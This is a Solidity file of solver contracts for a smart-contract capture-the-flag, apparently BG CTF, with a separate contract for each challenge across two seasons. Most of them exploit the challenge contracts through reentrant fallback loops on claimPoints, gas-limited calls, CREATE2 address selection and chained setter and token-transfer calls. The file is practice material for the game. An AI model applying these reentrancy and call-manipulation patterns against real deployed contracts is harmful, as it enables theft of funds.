// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IMintFlag {
    function mintFlag() external;
}

interface IJustCall {
    function justCallMe() external;
}

interface IChallenge5 {
    function claimPoints() external;
    function mintFlag() external;
}

interface IChallenge6 {
    function mintFlag(uint256) external;
}

interface IChallenge6S2 {
    function resetPoints() external;
    function claimPoints() external;
    function upgradeLevel() external;
    function mintFlag() external;
}

interface IChallenge8S2 {
    function mintFlag(bytes32) external payable;
}

interface IHeroNFT {
    function mint(string memory tokenURI) external returns (uint256);
}

interface IGoldApprove {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IChallenge12 {
    function mintFlag(uint256 tokenId) external;
}

contract S1Ch2Solver {
    function attack(address c) external {
        IJustCall(c).justCallMe();
    }
}

contract S1Ch3Solver {
    constructor(address c) {
        IMintFlag(c).mintFlag();
    }
}

contract S1Ch5Solver {
    IChallenge5 public c;
    uint256 private n;

    constructor(address _c) {
        c = IChallenge5(_c);
    }

    function attack() external {
        c.claimPoints();
        c.mintFlag();
    }

    fallback() external payable {
        if (n < 10) {
            n++;
            c.claimPoints();
            n--;
        }
    }
}

contract S1Ch6Solver {
    function name() external pure returns (string memory) {
        return "BG CTF Challenge 6 Solution";
    }

    function attack(address c, uint256 code, uint256 gasAmount) external {
        IChallenge6(c).mintFlag{ gas: gasAmount }(code);
    }
}

contract S2Ch3Solver {
    function accessKey() external pure returns (string memory) {
        return "LET_ME_IN";
    }

    function attack(address c) external {
        IMintFlag(c).mintFlag();
    }
}

contract S2Ch4Solver {
    address payable public target;

    constructor(address _t) payable {
        target = payable(_t);
    }

    function attack() external {
        IMintFlag(target).mintFlag();
    }

    receive() external payable {
        (bool ok, ) = target.call{ value: 1 gwei }("");
        require(ok, "send failed");
    }
}

contract S2Ch6Solver {
    IChallenge6S2 public c;
    uint256 private n;

    constructor(address _c) {
        c = IChallenge6S2(_c);
    }

    function attack() external {
        c.resetPoints();
        n = 0;
        c.claimPoints();
        for (uint256 i = 0; i < 5; i++) {
            c.upgradeLevel();
        }
        c.mintFlag();
    }

    fallback() external payable {
        if (n < 58) {
            n++;
            c.claimPoints();
        }
    }
}

contract S2Ch8Solver {
    IChallenge8S2 public c;

    constructor(address _c) payable {
        c = IChallenge8S2(_c);
    }

    function attack(bytes32 pw) external {
        c.mintFlag{ value: 2 }(pw);
    }

    receive() external payable {
        require(msg.value == 2, "only two");
    }
}

contract CallerSolver {
    function attack(address c) external {
        IMintFlag(c).mintFlag();
    }
}

contract Create2Factory {
    function deploy(bytes32 salt, bytes memory code) external returns (address addr) {
        assembly {
            addr := create2(0, add(code, 0x20), mload(code), salt)
        }
        require(addr != address(0), "create2 failed");
    }
}

interface IGoldFull {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDungeon {
    function setPosition(bytes32 value) external;
}

interface IQuest {
    function setCurrentQuest(uint256 value) external;
}

interface IVictory {
    function free(bool value) external;
}

contract S2Ch12Solver {
    IHeroNFT public hero;
    IGoldFull public gold;
    IChallenge12 public c12;
    IDungeon public dungeon;
    IQuest public quest;
    IVictory public victory;

    constructor(address _hero, address _gold, address _c12, address _dungeon, address _quest, address _victory) {
        hero = IHeroNFT(_hero);
        gold = IGoldFull(_gold);
        c12 = IChallenge12(_c12);
        dungeon = IDungeon(_dungeon);
        quest = IQuest(_quest);
        victory = IVictory(_victory);
    }

    // The player must approve this contract to spend their gold before calling.
    // Everything happens in one tx so blockhash(block.number - 1) is the caller's chosen block.
    function solveAll(bytes32 b_, string calldata uri, uint256 approveAmount, address enemy) external {
        uint256 b = uint256(b_);
        dungeon.setPosition(b_);
        quest.setCurrentQuest(1);
        victory.free(true);

        uint256 m = gold.balanceOf(msg.sender);
        require(m >= b + 3 ether, "not enough gold");
        uint256 e = (m - b - 1 ether) / 2;
        gold.transferFrom(msg.sender, address(this), b + 1 ether);
        gold.transferFrom(msg.sender, enemy, e);

        uint256 tokenId = hero.mint(uri);
        gold.approve(address(c12), approveAmount);
        c12.mintFlag(tokenId);
    }
}
